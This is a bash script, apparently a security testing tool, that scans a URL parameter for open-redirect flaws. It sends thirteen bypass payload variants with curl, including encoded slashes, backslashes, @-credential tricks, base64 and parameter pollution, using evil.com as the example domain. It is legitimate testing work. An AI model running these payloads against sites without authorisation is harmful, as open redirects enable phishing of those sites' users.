#!/bin/bash

# Exit codes
EXIT_SUCCESS=0
EXIT_FAILURE=1

# Color codes
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
MAGENTA='\033[0;35m'
CYAN='\033[0;36m'
GRAY='\033[0;90m'
NC='\033[0m' # No Color

# Help function
show_help() {
	cat <<EOF
Open Redirect Test Suite

Usage: $0 -u URL_TEMPLATE -d DOMAIN [-s PROTOCOL]

Required Options:
  -u URL          Full URL with {{INJECT}} placeholder (e.g., "http://example.com/redir?url={{INJECT}}&foo=bar")
  -d DOMAIN       Test domain for redirect (e.g., google.com)

Optional:
  -s PROTOCOL     Protocol prefix (e.g., http, https, etc.)

Other Options:
  -h              Show this help message

Examples:
  # Test with HTTP protocol
  $0 -u 'http://example.com/redir?url={{INJECT}}' -d evil.com -s http

  # Test with HTTPS protocol
  $0 -u 'http://localhost:5000/redirect?url={{INJECT}}' -d evil.com -s https
  
  # Test without protocol (domain only)
  $0 -u 'http://example.com/login?next={{INJECT}}' -d evil.com

  # Test with additional query parameters
  $0 -u 'https://example.com/index?domain={{INJECT}}&foo=bar' -d evil.com -s https

  # Test multiple parameters simultaneously
  $0 -u 'https://example.com/page?domain={{INJECT}}&redirect={{INJECT}}' -d evil.com -s http
  
  # Test with custom protocol prefix
  $0 -u 'http://example.com/go?url={{INJECT}}' -d evil.com -s javascript
  
EOF
	exit $EXIT_SUCCESS
}

# Banner function
banner() {
	echo -e "${MAGENTA}"
	cat <<"EOF"
┌─────────────────────────────────────────────┐
│                                             │
│     ╔═╗╔═╗╔═╗╔╗╔  ╦═╗╔═╗╔╦╗╦╦═╗╔═╗╔═╗╔╦╗    │
│     ║ ║╠═╝║╣ ║║║  ╠╦╝║╣  ║║║╠╦╝║╣ ║   ║     │
│     ╚═╝╩  ╚═╝╝╚╝  ╩╚═╚═╝═╩╝╩╩╚═╚═╝╚═╝ ╩     │
│                                             │
│        Bypass Technique Scanner v1.0        │
│                 by olofmagn                 │
│                                             │
└─────────────────────────────────────────────┘
EOF
	echo -e "${NC}"
}

# Configuration function
configuration() {
	echo ""
	echo -e "${MAGENTA}╔═══════════════════════════════════════╗${NC}"
	echo -e "${MAGENTA}║         CONFIGURATION                 ║${NC}"
	echo -e "${MAGENTA}╚═══════════════════════════════════════╝${NC}"
	echo -e "${MAGENTA}URL Template: ${URL_TEMPLATE}${NC}"
	echo -e "${MAGENTA}Test Domain:  ${TEST_DOMAIN}${NC}"
	echo -e "${MAGENTA}Protocol:     ${PROTOCOL:-none}${NC}"
	if [[ -n "$PROTOCOL" ]]; then
		echo -e "${MAGENTA}Example URL:  $(inject_payload "${PROTOCOL}://${TEST_DOMAIN}")${NC}"
	else
		echo -e "${MAGENTA}Example URL:  $(inject_payload "${TEST_DOMAIN}")${NC}"
	fi
	echo -e "${MAGENTA}═══════════════════════════════════════${NC}"
	echo ""
}

# Summary function
summary() {
	echo -e "${MAGENTA}╔═══════════════════════════════════════╗${NC}"
	echo -e "${MAGENTA}║          SUMMARY OF RUN               ║${NC}"
	echo -e "${MAGENTA}╚═══════════════════════════════════════╝${NC}"
	echo -e "${MAGENTA}Total tests run:       ${NC}$TOTAL_TEST"
	echo -e "${RED}Vulnerabilities found: ${NC}$VULN_COUNT"
	echo ""

	if [[ "$VULN_COUNT" -gt 0 ]]; then
		echo -e "${RED}⚠️  OPEN REDIRECT VULNERABILITIES DETECTED!${NC}"
	else
		echo -e "${GREEN}✓ No vulnerabilities detected in these tests.${NC}"
	fi
}

# Inject function
inject_payload() {
	local payload="$1"
	echo "${URL_TEMPLATE//\{\{INJECT\}\}/$payload}"
}

# Check redirect function
check_redirect() {
	local response="$1"
	if echo "$response" | grep -qiE "HTTP/.* 3[0-9]{2}" &&
		echo "$response" | grep -qiE "Location:.*$TEST_DOMAIN"; then
		return 0
	fi
	return 1
}

if [[ "$1" == "-h" ]] || [[ "$1" == "--help" ]]; then
	show_help
fi

# ===== Setup =====

# Initialize flags
GOT_URL=false
GOT_DOMAIN=false
GOT_PROTOCOL=false

# Parse command-line options
while getopts ":u:d:s:h" opt; do
	case $opt in
	u)
		URL_TEMPLATE="$OPTARG"
		GOT_URL=true
		;;
	d)
		TEST_DOMAIN="$OPTARG"
		GOT_DOMAIN=true
		;;
	s)
		PROTOCOL="$OPTARG"
		GOT_PROTOCOL=true
		;;
	h)
		show_help
		;;
	:)
		echo -e "${RED}Error: Option -$OPTARG requires an argument${NC}" >&2
		echo "Use -h or --help for usage information"
		exit $EXIT_FAILURE
		;;
	\?)
		echo -e "${RED}Error: Invalid option: -$OPTARG${NC}" >&2
		echo "Use -h or --help for usage information"
		exit $EXIT_FAILURE
		;;
	esac
done

# Process the remaining arguments
shift $((OPTIND - 1))

MISSING_ARGS=()
[ "$GOT_URL" = false ] && MISSING_ARGS+=("-u URL")
[ "$GOT_DOMAIN" = false ] && MISSING_ARGS+=("-d DOMAIN")

if [[ ${#MISSING_ARGS[@]} -gt 0 ]]; then
	echo -e "${RED}Error: Missing required arguments: ${MISSING_ARGS[*]}${NC}"
	echo "Use -h or --help for usage information"
	exit $EXIT_FAILURE
fi

if [[ ! "$URL_TEMPLATE" =~ \{\{INJECT\}\} ]]; then
	echo -e "${RED}Error: URL must contain {{INJECT}} placeholder${NC}"
	exit $EXIT_FAILURE
fi

# Base64 encoding
if [[ -n "$PROTOCOL" ]]; then
	base64encoded_protocolanddomain=$(echo -n "$PROTOCOL://$TEST_DOMAIN" | base64)
else
	base64encoded_protocolanddomain=$(echo -n "$TEST_DOMAIN" | base64)
fi

banner

configuration

# Initialize counters
VULN_COUNT=0
TOTAL_TEST=0

# ===== Scanning =====

# Test 1: Basic redirect with protocol
echo -e "${YELLOW}[Test 1] Basic redirect${NC}"
((TOTAL_TEST++))
if [[ -n "$PROTOCOL" ]]; then
	TEST_URL=$(inject_payload "$PROTOCOL://$TEST_DOMAIN")
else
	TEST_URL=$(inject_payload "$TEST_DOMAIN")
fi
RESPONSE=$(curl -i -s --max-time 10 "$TEST_URL" 2>&1)
echo -e "${CYAN}$RESPONSE${NC}"
if check_redirect "$RESPONSE"; then
	echo -e "${RED}🚨 302 REDIRECT to $TEST_DOMAIN${NC}"
	((VULN_COUNT++))
fi
echo ""

# Test 2: Trailing dot (Valid DNS FQDN)
echo -e "${YELLOW}[Test 2] Trailing dot${NC}"
((TOTAL_TEST++))
if [[ -n "$PROTOCOL" ]]; then
	TEST_URL=$(inject_payload "$PROTOCOL://$TEST_DOMAIN.")
else
	TEST_URL=$(inject_payload "$TEST_DOMAIN.")
fi
RESPONSE=$(curl -i -s --max-time 10 "$TEST_URL" 2>&1)
echo -e "${CYAN}$RESPONSE${NC}"
if check_redirect "$RESPONSE"; then
	echo -e "${RED}🚨 302 REDIRECT to $TEST_DOMAIN${NC}"
	((VULN_COUNT++))
fi
echo ""

# Test 3: Protocol-relative
echo -e "${YELLOW}[Test 3] Protocol-relative URL${NC}"
((TOTAL_TEST++))
TEST_URL=$(inject_payload "//$TEST_DOMAIN")
RESPONSE=$(curl -i -s --max-time 10 "$TEST_URL" 2>&1)
echo -e "${CYAN}$RESPONSE${NC}"
if check_redirect "$RESPONSE"; then
	echo -e "${RED}🚨 302 REDIRECT to $TEST_DOMAIN${NC}"
	((VULN_COUNT++))
fi
echo ""

# Test 4: No protocol
echo -e "${YELLOW}[Test 4] No protocol${NC}"
((TOTAL_TEST++))
TEST_URL=$(inject_payload "$TEST_DOMAIN")
RESPONSE=$(curl -i -s --max-time 10 "$TEST_URL" 2>&1)
echo -e "${CYAN}$RESPONSE${NC}"
if check_redirect "$RESPONSE"; then
	echo -e "${RED}🚨 302 REDIRECT to $TEST_DOMAIN${NC}"
	((VULN_COUNT++))
fi
echo ""

# Test 5: Encoded slashes
echo -e "${YELLOW}[Test 5] URL-encoded slashes${NC}"
((TOTAL_TEST++))
if [[ -n "$PROTOCOL" ]]; then
	TEST_URL=$(inject_payload "$PROTOCOL:%2f%2f$TEST_DOMAIN")
else
	TEST_URL=$(inject_payload "$TEST_DOMAIN")
fi
RESPONSE=$(curl -i -s --max-time 10 "$TEST_URL" 2>&1)
echo -e "${CYAN}$RESPONSE${NC}"
if check_redirect "$RESPONSE"; then
	echo -e "${RED}🚨 302 REDIRECT to $TEST_DOMAIN${NC}"
	((VULN_COUNT++))
fi
echo ""

# Test 6: Backslash confusion
echo -e "${YELLOW}[Test 6] Backslash confusion${NC}"
((TOTAL_TEST++))
if [[ -n "$PROTOCOL" ]]; then
	TEST_URL=$(inject_payload "$PROTOCOL:\\\\\\\\$TEST_DOMAIN")
else
	TEST_URL=$(inject_payload "\\\\\\\\$TEST_DOMAIN")
fi
RESPONSE=$(curl -i -s --max-time 10 "$TEST_URL" 2>&1)
echo -e "${CYAN}$RESPONSE${NC}"
if check_redirect "$RESPONSE"; then
	echo -e "${RED}🚨 302 REDIRECT to $TEST_DOMAIN${NC}"
	((VULN_COUNT++))
fi
echo ""

# Test 7: @ symbol credential bypass
echo -e "${YELLOW}[Test 7] @ symbol (credential bypass)${NC}"
((TOTAL_TEST++))
if [[ -n "$PROTOCOL" ]]; then
	TEST_URL=$(inject_payload "$PROTOCOL://google.com@$TEST_DOMAIN")
else
	TEST_URL=$(inject_payload "google.com@$TEST_DOMAIN")
fi
RESPONSE=$(curl -i -s --max-time 10 "$TEST_URL" 2>&1)
echo -e "${CYAN}$RESPONSE${NC}"
if check_redirect "$RESPONSE"; then
	echo -e "${RED}🚨 302 REDIRECT to $TEST_DOMAIN${NC}"
	((VULN_COUNT++))
fi
echo ""

# Test 8: Triple slash
echo -e "${YELLOW}[Test 8] Triple slash bypass${NC}"
((TOTAL_TEST++))
if [[ -n "$PROTOCOL" ]]; then
	TEST_URL=$(inject_payload "$PROTOCOL:///$TEST_DOMAIN")
else
	TEST_URL=$(inject_payload "///$TEST_DOMAIN")
fi
RESPONSE=$(curl -i -s --max-time 10 "$TEST_URL" 2>&1)
echo -e "${CYAN}$RESPONSE${NC}"
if check_redirect "$RESPONSE"; then
	echo -e "${RED}🚨 302 REDIRECT to $TEST_DOMAIN${NC}"
	((VULN_COUNT++))
fi
echo ""

# Test 9: Fully encoded URL
echo -e "${YELLOW}[Test 9] Fully URL-encoded${NC}"
((TOTAL_TEST++))
if [[ -n "$PROTOCOL" ]]; then
	TEST_URL=$(inject_payload "$PROTOCOL%3A%2F%2F$TEST_DOMAIN")
else
	TEST_URL=$(inject_payload "$TEST_DOMAIN")
fi
RESPONSE=$(curl -i -s --max-time 10 "$TEST_URL" 2>&1)
echo -e "${CYAN}$RESPONSE${NC}"
if check_redirect "$RESPONSE"; then
	echo -e "${RED}🚨 302 REDIRECT to $TEST_DOMAIN${NC}"
	((VULN_COUNT++))
fi
echo ""

# Test 10: Whitespace prefix
echo -e "${YELLOW}[Test 10] Whitespace prefix${NC}"
((TOTAL_TEST++))
if [[ -n "$PROTOCOL" ]]; then
	TEST_URL=$(inject_payload "%20$PROTOCOL://$TEST_DOMAIN")
else
	TEST_URL=$(inject_payload "%20$TEST_DOMAIN")
fi
RESPONSE=$(curl -i -s --max-time 10 "$TEST_URL" 2>&1)
echo -e "${CYAN}$RESPONSE${NC}"
if check_redirect "$RESPONSE"; then
	echo -e "${RED}🚨 302 REDIRECT to $TEST_DOMAIN${NC}"
	((VULN_COUNT++))
fi
echo ""

# Test 11: Base64 encoding
echo -e "${YELLOW}[Test 11] Base64 encoding${NC}"
((TOTAL_TEST++))
TEST_URL=$(inject_payload "$base64encoded_protocolanddomain")
RESPONSE=$(curl -i -s --max-time 10 "$TEST_URL" 2>&1)
echo -e "${CYAN}$RESPONSE${NC}"
if check_redirect "$RESPONSE"; then
	echo -e "${RED}🚨 302 REDIRECT to $TEST_DOMAIN${NC}"
	((VULN_COUNT++))
fi
echo ""

# Test 12: JavaScript redirect detection
echo -e "${YELLOW}[Test 12] JavaScript redirect detection${NC}"
((TOTAL_TEST++))
if [[ -n "$PROTOCOL" ]]; then
	TEST_URL=$(inject_payload "$PROTOCOL://$TEST_DOMAIN")
else
	TEST_URL=$(inject_payload "$TEST_DOMAIN")
fi
RESPONSE=$(curl -i -s --max-time 10 "$TEST_URL" 2>&1)
echo -e "${CYAN}$RESPONSE${NC}"
if echo "$RESPONSE" | grep -qiE "window\.location|location\.href|document\.location"; then
	echo -e "${RED}🚨 JavaScript REDIRECT detected${NC}"
	((VULN_COUNT++))
fi
echo ""

# Test 13: Parameter pollution
echo -e "${YELLOW}[Test 13] Parameter pollution - testing alternative redirect parameters${NC}"
((TOTAL_TEST++))
VULNERABLE=false

# Extract base URL without the injection parameter
BASE_URL_FOR_POLLUTION=$(echo "$URL_TEMPLATE" | cut -d'?' -f1)

for ALT_PARAM in "next" "redirect" "destination" "return" "returnUrl" "continue" "redir" "url"; do
	if [[ -n "$PROTOCOL" ]]; then
		TEST_PAYLOAD="${PROTOCOL}://${TEST_DOMAIN}"
	else
		TEST_PAYLOAD="${TEST_DOMAIN}"
	fi

	POLLUTION_URL="${BASE_URL_FOR_POLLUTION}?${ALT_PARAM}=${TEST_PAYLOAD}"

	# Test more parameters if original URL has query parameters
	echo -e "${GRAY}  Testing: ${POLLUTION_URL}${NC}"

	RESPONSE=$(curl -i -s --max-time 10 "$POLLUTION_URL" 2>&1)

	if check_redirect "$RESPONSE"; then
		echo -e "${RED}  🚨 VULNERABLE! Server used '${ALT_PARAM}' parameter${NC}"
		echo ""
		echo -e "${CYAN}${RESPONSE}${NC}"
		VULNERABLE=true
	fi
done

if [[ "$VULNERABLE" = true ]]; then
	((VULN_COUNT++))
else
	echo -e "${GREEN}  ✓ Safe - No alternative parameters accepted${NC}"
fi
echo ""

# Run summary
summary
